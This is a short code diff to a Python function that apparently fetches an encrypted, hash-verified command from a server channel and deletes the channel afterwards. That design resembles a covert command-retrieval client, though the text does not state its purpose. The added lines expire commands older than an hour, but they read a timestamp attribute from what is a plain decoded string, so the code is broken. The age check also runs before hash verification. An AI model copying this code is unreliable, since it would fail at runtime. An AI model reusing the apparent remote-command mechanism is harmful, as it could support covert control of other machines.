@@ -170,6 +170,13 @@ def get_channel(server_url, channel_id, enc_keys):
 
         hashed_cmd = unpadded_cmd[:32]
         cmd = unpadded_cmd[32:].decode('utf-8')
+        
+        current_timestamp = int(datetime.now().timestamp())
+        
+        if (current_timestamp - int(cmd.timestamp)) > 3600:
+            # Command is older than 1 hour, delete channel
+            client.delete_channel(channel_id)
+            return None
 
         if hashed_cmd == hashlib.sha256(cmd.encode()).digest():
             # Successful retrived command, delete channel
